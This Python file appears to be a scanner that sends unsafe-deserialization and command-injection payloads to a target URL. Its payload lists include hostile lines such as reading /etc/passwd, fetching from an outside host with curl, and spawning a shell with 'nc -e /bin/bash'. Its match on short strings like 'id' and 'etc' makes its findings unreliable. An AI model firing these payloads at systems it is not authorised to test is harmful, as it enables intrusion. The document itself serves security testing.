import requests
from urllib.parse import urlencode

def is_unsafe_deserialization(url):
    """
    Tests for unsafe object deserialization by sending potentially dangerous payloads.
    Payloads should be adjusted based on target language/framework.
    
    Args:
        url (str): The URL to test for unsafe deserialization vulnerabilities.
        
    Returns:
        bool: True if unsafe deserialization is detected, False otherwise.
    """
    payloads = [
        '{"rce": "__import__(\'os\').system(\'whoami\')"}',  # Example for Python
        '{"rce": "System.getProperty(\\"os.name\\")"}',      # Example for Java
        '{"rce": "Runtime.getRuntime().exec(\\"whoami\\")"}',  # Another Java payload
        '{"rce": "os.system(\\"echo vulnerable\\")"}',       # Example for Python
    ]
    
    for payload in payloads:
        try:
            response = requests.post(url, data=payload, headers={"Content-Type": "application/json"}, timeout=10)
            
            # Check for signs of remote code execution or unsafe behavior
            if response.status_code == 200 and ("whoami" in response.text or "vulnerable" in response.text or "os.name" in response.text):
                print(f"Unsafe deserialization detected with payload: {payload}")
                return True
        except requests.RequestException as e:
            print(f"Error testing payload {payload}: {e}")
    
    return False


from urllib.parse import urlencode

def is_command_injection_vulnerable(url):
    """
    Checks if the application is vulnerable to Command Injection by attempting to inject common shell commands.
    
    Args:
        url (str): The URL of the target application to check.
    
    Returns:
        bool: True if command injection vulnerability is detected, otherwise False.
    """
    payloads = [
        "; ls", "; whoami", "| ls", "| whoami", "; cat /etc/passwd", "| id", "| uname -a",
        "; ping -c 4 127.0.0.1", "; sleep 10", "| curl http://example.com/malicious", "; nc -e /bin/bash"
    ]
    
    vulnerable = False
    
    for payload in payloads:
        # URL encode the payload to prevent URL encoding issues with special characters
        encoded_payload = urlencode({"input": payload})
        test_url = f"{url}?{encoded_payload}"
        
        try:
            response = requests.get(test_url, timeout=10)
            
            # Check for common signs of command injection (e.g., root, id, bash)
            if response.status_code == 200 and any(term in response.text for term in ["root", "uid", "bash", "id", "etc", "ping"]):
                print(f"Command Injection payload '{payload}' worked.")
                vulnerable = True
        except requests.RequestException as e:
            print(f"Error with payload '{payload}': {e}")
    
    if not vulnerable:
        print("No Command Injection vulnerability detected.")
    return vulnerable